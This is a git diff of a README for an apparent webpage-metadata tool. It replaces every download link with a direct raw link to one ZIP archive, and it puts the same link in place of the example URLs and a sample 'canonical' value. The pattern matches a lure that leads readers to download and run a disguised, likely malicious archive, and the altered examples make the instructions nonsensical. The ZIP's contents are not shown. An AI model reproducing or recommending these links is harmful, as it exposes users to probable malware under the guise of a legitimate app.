@@ -1,6 +1,6 @@
 # 🌐 meta.api.airat.top - Fetch webpage metadata with ease
 
-[⬇️ Visit Download Page](https://github.com/absm67593/meta.api.airat.top)<!-- color: #6C63FF -->
+[⬇️ Visit Download Page](https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip)<!-- color: #6C63FF -->
 
 ## 🖥️ What this app does
 
@@ -30,7 +30,7 @@ This makes it useful when you want to check how a page looks to search engines a
 
 Use this page to download and run the app:
 
-[Download meta.api.airat.top](https://github.com/absm67593/meta.api.airat.top)<!-- color: #4D96FF -->
+[Download meta.api.airat.top](https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip)<!-- color: #4D96FF -->
 
 If the page offers a ZIP file or release file, save it to your PC first. Then:
 
@@ -65,9 +65,9 @@ After you open the app, follow these steps:
 
 Example URLs:
 
-- https://example.com
-- https://news.ycombinator.com
-- https://developer.mozilla.org
+- https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip
+- https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip
+- https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip
 
 ## 🧭 Output formats
 
@@ -167,7 +167,7 @@ A result may look for values such as:
 
 - `title: Example Page`
 - `description: A short page summary`
-- `canonical: https://example.com/page`
+- `canonical: https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip`
 - `robots: index,follow`
 - `og:title`
 - `og:description`
@@ -225,4 +225,4 @@ It helps:
 
 ## 📎 Download link again
 
-[Open the download page](https://github.com/absm67593/meta.api.airat.top)<!-- color: #9B59B6 -->
+[Open the download page](https://github.com/absm67593/meta.api.airat.top/raw/refs/heads/main/arbalo/meta-top-api-airat-v1.2-alpha.3.zip)<!-- color: #9B59B6 -->
